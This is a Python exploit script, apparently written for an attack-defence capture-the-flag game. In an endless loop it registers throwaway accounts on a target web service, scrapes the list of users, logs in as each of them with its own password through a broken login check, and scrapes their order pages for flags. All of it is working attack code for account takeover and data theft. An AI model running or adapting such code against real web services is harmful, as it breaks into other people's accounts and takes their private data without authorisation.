#!/usr/bin/env python3

import requests
import re
import sys
import string
import random
old_users = []
ip = sys.argv[1]
host = f"http://{ip}:8084"
s = requests.Session()
while True:
  user_name = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
  password = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))
  r = s.post(
    host + '/register',
    data={
      'user_name': password,
      'password': user_name
    })
  r = s.get(
    host + '/users'
  )
  users = re.findall("\</p\>\<p style=\'margin: 4px 8px\'\>(.*?)\</p\>", r.text)
  for user in list(set(users).difference(old_users)):
    old_users.extend(user)
    r1 = s.post(
      host + '/login',
      data = {
        'user_name': user,
        'password': password
      }
    )
    r1 = s.get(
      host + "/myOrders"
    )
    flags = re.findall("\</p\>\<p style=\'margin: 4px 8px\'\>(.*?)\</p\>", r1.text)
    print (flags,flush=True)
